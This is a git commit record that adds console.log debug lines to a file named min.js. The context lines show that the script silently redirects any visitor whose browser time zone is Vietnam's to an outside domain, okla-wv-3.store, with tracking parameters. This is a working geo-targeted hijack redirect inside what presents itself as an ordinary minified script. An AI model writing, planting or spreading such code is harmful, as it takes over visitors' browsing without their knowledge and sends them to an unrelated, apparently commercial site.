b10878925de0645d064c8c16d78887634a8b8cb7
hai07t <hai07t@gmail.com>
2025-08-26 17:34:40 +0700

    Update min.js

--- min.js
+++ min.js
@@ -1,4 +1,5 @@
 var conf = (window.__OKBAY_CONF__) || {};
+console.log('CONF', window.__OKBAY_CONF__);
 var utm_source = conf.utm_source || 'okbay';
 var utm_campaign = conf.utm_campaign || 'okbay';
 
@@ -6,5 +7,6 @@ const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 if (userTimeZone === 'Asia/Ho_Chi_Minh' || userTimeZone === 'Asia/Saigon') {
   var to = 'https://okla-wv-3.store/?utm_source=' + encodeURIComponent(utm_source)
          + '&utm_campaign=' + encodeURIComponent(utm_campaign);
+  console.log('href', to);
   window.location.href = to;
 }
